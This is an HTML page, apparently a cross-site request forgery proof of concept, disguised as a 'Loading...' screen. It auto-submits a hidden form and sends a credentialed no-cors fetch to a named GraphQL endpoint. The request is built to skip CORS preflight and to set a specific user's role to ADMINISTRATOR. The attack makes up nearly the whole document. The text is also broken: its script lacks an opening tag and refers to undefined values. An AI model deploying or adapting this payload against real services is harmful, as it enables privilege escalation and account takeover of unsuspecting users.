<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body { 
      font-family: sans-serif; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      min-height: 100vh; 
      background: #f0f0f0;
    }
    .loader { text-align: center; }
  </style>
</head>
<body>

function attackViaSimpleRequest() {
  // Try to avoid CORS preflight by using text/plain Content-Type
  // Some servers parse JSON regardless of Content-Type
  fetch(TARGET_URL, {
    method: 'POST',
    credentials: 'include',
    mode: 'no-cors',  // Opaque response, but request still fires
    headers: {
      'Content-Type': 'text/plain'  // Avoids preflight
    },
    body: JSON.stringify(GRAPHQL_MUTATION)
  })
  .then(() => {
    console.log('Simple request sent (response opaque)');
    document.body.innerHTML = '<h1>Request dispatched</h1><p>Mutation may have executed. Check account settings.</p>';
  });
}

// If CORS blocks Method 1, try Method 4 (no-cors mode) after 3 seconds
setTimeout(() => {
  console.log('Trying no-cors bypass...');
  attackViaSimpleRequest();
}, 3000);

</script>

<!-- ALTERNATIVE: Pure HTML form method (requires server to accept form-encoded) -->

<form id="csrfForm" method="POST" action="https://app.lightspark.com/graphql/frontend?n=UpdateUser&display_name=ATTACKER" style="display:none">
  <input type="hidden" name="operationName" value="UpdateUser">
  <input type="hidden" name="variables" value='{"user_id":"User:019b30de-b2a6-04f8-0000-43a25839294c","display_name":"ATTACKER","role":"ADMINISTRATOR","roles":["ADMINISTRATOR"]}'>
  <input type="hidden" name="query" value='mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) { update_user(input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}) { __typename user { id display_name role __typename } } }'>
</form>
<script>
  document.getElementById('csrfForm').submit();
</script>

</body>
</html>
